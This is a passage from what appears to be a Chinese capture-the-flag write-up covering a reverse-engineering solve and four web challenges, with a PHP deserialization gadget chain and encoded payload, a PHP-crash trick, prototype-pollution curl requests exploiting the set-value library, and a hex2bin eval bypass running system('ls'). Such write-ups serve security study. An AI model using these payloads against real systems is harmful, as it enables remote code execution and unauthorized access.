</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>鉴于这是个Windows 32位程序，<code>fs[0x30]</code>处是进程的PEB，<code>fs:[0x30] + 2</code>处是<code>PEB.BeingDebugged</code>标志（参考：<a href="http://terminus.rewolf.pl/terminus/structures/ntdll/_PEB_x86.html" target="_blank" rel="noopener noreferrer">Terminus Project<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>）。鉴于我们在静态分析，直接假定这里的值为0（程序没被调试时运行一定是正常的），就可以恢复出算法了：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python3</span>

target <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token number">0xDD</span><span class="token punctuation">,</span> <span class="token number">0x5B</span><span class="token punctuation">,</span> <span class="token number">0x9E</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x9E</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> 
    <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0x92</span><span class="token punctuation">,</span> <span class="token number">0xDE</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0xD1</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x9E</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> 
    <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x9E</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> 
    <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0xD2</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0x92</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x9E</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> 
    <span class="token number">0xD2</span><span class="token punctuation">,</span> <span class="token number">0x9F</span>
<span class="token punctuation">]</span>

<span class="token keyword">for</span> c <span class="token keyword">in</span> target<span class="token punctuation">:</span>
    c <span class="token operator">-=</span> <span class="token number">0x23</span>
    c <span class="token operator">&amp;</span><span class="token operator">=</span> <span class="token number">0xff</span>
    c <span class="token operator">^</span><span class="token operator">=</span> <span class="token number">0x23</span>
    c <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>c <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>c <span class="token operator">&gt;&gt;</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span> end <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span>
    <span class="token comment">#print(hex(c), end = ' ')</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><p>题不难，就是为了让反编译器能工作，patch花了不少时间，以至于刚刚patch完看到了程序逻辑，大师傅已经做完了。大师傅永远是你大师傅。</p> <p><code>flag{a959951b-76ca-4784-add7-93583251ca92}</code></p> <h2 id="web"><a href="#web" class="header-anchor">#</a> web</h2> <h3 id="babyunserialize"><a href="#babyunserialize" class="header-anchor">#</a> babyunserialize</h3> <p>由于本题环境和wmctf的webweb很相似，因此套用同一个payload：</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">DB</span><span class="token punctuation">{</span>
    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Cursor</span>  <span class="token keyword">implements</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>IteratorAggregate</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token punctuation">}</span>


<span class="token keyword">namespace</span> <span class="token package">DB<span class="token punctuation">\</span>SQL</span><span class="token punctuation">{</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Mapper</span> <span class="token keyword">extends</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>DB<span class="token punctuation">\</span>Cursor</span><span class="token punctuation">{</span>
        <span class="token keyword">protected</span>
            <span class="token variable">$props</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;quotekey&quot;</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">&quot;system&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token variable">$adhoc</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;ls -al&quot;</span><span class="token operator">=&gt;</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;expr&quot;</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token variable">$db</span><span class="token punctuation">;</span>
        <span class="token keyword">function</span> <span class="token function-definition function">offsetExists</span><span class="token punctuation">(</span><span class="token variable">$offset</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
        <span class="token keyword">function</span> <span class="token function-definition function">offsetGet</span><span class="token punctuation">(</span><span class="token variable">$offset</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
        <span class="token keyword">function</span> <span class="token function-definition function">offsetSet</span><span class="token punctuation">(</span><span class="token variable">$offset</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
        <span class="token keyword">function</span> <span class="token function-definition function">offsetUnset</span><span class="token punctuation">(</span><span class="token variable">$offset</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
        <span class="token keyword">function</span> <span class="token function-definition function">getIterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">db</span> <span class="token operator">=</span> <span class="token variable">$val</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">namespace</span> <span class="token package">CLI</span><span class="token punctuation">{</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Agent</span> <span class="token punctuation">{</span>
        <span class="token keyword">protected</span>
            <span class="token variable">$server</span><span class="token operator">=</span><span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token variable">$events</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">events</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;disconnect&quot;</span><span class="token operator">=&gt;</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>DB<span class="token punctuation">\</span>SQL<span class="token punctuation">\</span>Mapper</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>DB<span class="token punctuation">\</span>SQL<span class="token punctuation">\</span>Mapper</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string double-quoted-string">&quot;find&quot;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">server</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$this</span><span class="token punctuation">;</span>


        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">WS</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">namespace</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>CLI<span class="token punctuation">\</span>WS</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>CLI<span class="token punctuation">\</span>Agent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</span></code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br></div></div><p>但执行过程中发现<code>system</code>被ban了，<code>passthru</code>也被ban了，试图进<code>phpinfo</code>里看看，但把这个payload中<code>$adhoc</code>的<code>ls -al</code>置空会报一个错：</p> <p><img src="/assets/img/2020-ciscn-babyunserialize-1.1e3a069d.png" alt=""></p> <p>因此把<code>ls -al</code>的位置改成<code>1</code>执行<code>phpinfo</code>。出来了一部分：</p> <p><img src="/assets/img/2020-ciscn-babyunserialize-2.9b482243.png" alt=""></p> <p>然后将<code>1</code>改成了<code>-1</code>成功执行完整<code>phpinfo</code>（参考：<a href="https://www.php.net/manual/en/function.phpinfo.php" target="_blank" rel="noopener noreferrer"><code>phpinfo()</code> 文档<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>），搜索flag发现有搜到：</p> <p><img src="/assets/img/2020-ciscn-babyunserialize-3.a4bbafe8.png" alt=""></p> <p>最终payload：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>http://XXXXXXXX.ichunqiu.com/?flag=a%3A2%3A%7Bi%3A0%3BO%3A6%3A%22CLI%5CWS%22%3A0%3A%7B%7Di%3A1%3BO%3A9%3A%22CLI%5CAgent%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00server%22%3Br%3A3%3Bs%3A6%3A%22events%22%3Ba%3A1%3A%7Bs%3A10%3A%22disconnect%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A13%3A%22DB%5CSQL%5CMapper%22%3A3%3A%7Bs%3A8%3A%22%00%2A%00props%22%3Ba%3A1%3A%7Bs%3A8%3A%22quotekey%22%3Bs%3A7%3A%22phpinfo%22%3B%7Ds%3A8%3A%22%00%2A%00adhoc%22%3Ba%3A1%3A%7Bi%3A-1%3Ba%3A1%3A%7Bs%3A4%3A%22expr%22%3Bs%3A0%3A%22%22%3B%7D%7Ds%3A5%3A%22%00%2A%00db%22%3BO%3A13%3A%22DB%5CSQL%5CMapper%22%3A3%3A%7Bs%3A8%3A%22%00%2A%00props%22%3Ba%3A1%3A%7Bs%3A8%3A%22quotekey%22%3Bs%3A7%3A%22phpinfo%22%3B%7Ds%3A8%3A%22%00%2A%00adhoc%22%3Ba%3A1%3A%7Bi%3A-1%3Ba%3A1%3A%7Bs%3A4%3A%22expr%22%3Bs%3A0%3A%22%22%3B%7D%7Ds%3A5%3A%22%00%2A%00db%22%3Bs%3A0%3A%22%22%3B%7D%7Di%3A1%3Bs%3A4%3A%22find%22%3B%7D%7D%7D%7D
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><code>flag{fb96e72f-aa1d-4d47-b5f5-67d6fc313293}</code></p> <h3 id="easyphp"><a href="#easyphp" class="header-anchor">#</a> easyphp</h3> <p>开环境是一个php审计，大致流程：开启一个子进程，如果该进程崩了就进else if，并且打印phpinfo，如果正常则进else，在这里有个<code>call_user_func_array</code>可以控制执行函数和参数，但参数限定了三个这里没法直接调用系统命令函数。</p> <p>直接执行系统命令走不通，考虑到题干“怎么可能让进程崩掉”和php7.4.8的环境，可能考察的是调用该版本内置的php函数造成进程崩溃即php fatal error。将php内置函数用burpsuite传一遍发现有几个函数函数可以让进程崩溃进到phpinfo中，这里选择<code>is_callable</code>函数，phpinfo中有flag。</p> <p>payload：<code>http://XXXXXXXX.ichunqiu.com/?a=is_callable</code></p> <p><img src="/assets/img/2020-ciscn-easyphp-1.8e709c31.png" alt=""></p> <p><img src="/assets/img/2020-ciscn-easyphp-2.dface1e0.png" alt=""></p> <p><code>flag{4b8e3e8d-837c-4d43-88b9-8a87010b1edc}</code></p> <h3 id="littlegame"><a href="#littlegame" class="header-anchor">#</a> littlegame</h3> <p>将附件下载下来是一个nodejs程序，同时加载进一个<code>set-value</code>模块，上网搜索发现<code>set-value</code>有CVE-2019-10747原型链污染的漏洞。本地跑起程序然后对路由进行审计，整个过程从<code>/SpawnPoint</code>开始，在<code>/Privilege</code>中调用了漏洞方法<code>setFn()</code>，这里的的<code>NewAttributeKey</code>和<code>NewAttributeValue</code>都可以控制，那么直接污染<code>__proto__</code>将<code>Admin</code>追加一个属性，使其在<code>/DeveloperControlPanel</code>路由中可以通过验证输出flag。</p> <p>payload（curl版）：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>$ curl -c cookies.txt http://XXXXXXXX.ichunqiu.com:8888/SpawnPoint
Let's begin!
$ curl -b cookies.txt -H 'Content-Type: application/json' -d '{&quot;NewAttributeKey&quot;:&quot;__proto__.password4&quot;,&quot;NewAttributeValue&quot;:&quot;123&quot;}' http://XXXXXXXX.ichunqiu.com:8888/Privilege
Let's have a check!
$ curl -b cookies.txt -H 'Content-Type: application/json' -d '{&quot;key&quot;:&quot;password4&quot;,&quot;password&quot;:&quot;123&quot;}' http://XXXXXXXX.ichunqiu.com:8888/DeveloperControlPanel
flag{7fae5d9b-2260-4472-a821-96ec1d6912b8}
$
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p><code>flag{7fae5d9b-2260-4472-a821-96ec1d6912b8}</code></p> <h3 id="rceme"><a href="#rceme" class="header-anchor">#</a> rceme</h3> <p>经过查阅是zzzcms的一个改编源码。主要漏洞点在于<code>eval</code>函数的参数没采用白名单机制，造成参数绕过验证。这里没有过滤<code>hex2bin</code>，因此将<code>system</code>十六进制编码后用<code>hex2bin</code>动态拼接成<code>system('ls')</code>来执行系统命令。</p> <p>payload: <code>{if:(hex2bin(‘73797374656d’))(‘ls‘)}{end if}</code></p> <p><code>flag{423975f5-e1d3-481a-9165-f297ed481cfe}</code></p></div> <footer class="page-edit"><!----> <!----></footer> <!----> </main></div><div class="global-ui"></div></div>
    <script src="/assets/js/app.1eac7796.js" defer></script><script src="/assets/js/2.da4aa226.js" defer></script><script src="/assets/js/9.72c27c98.js" defer></script>
  </body>
</html>
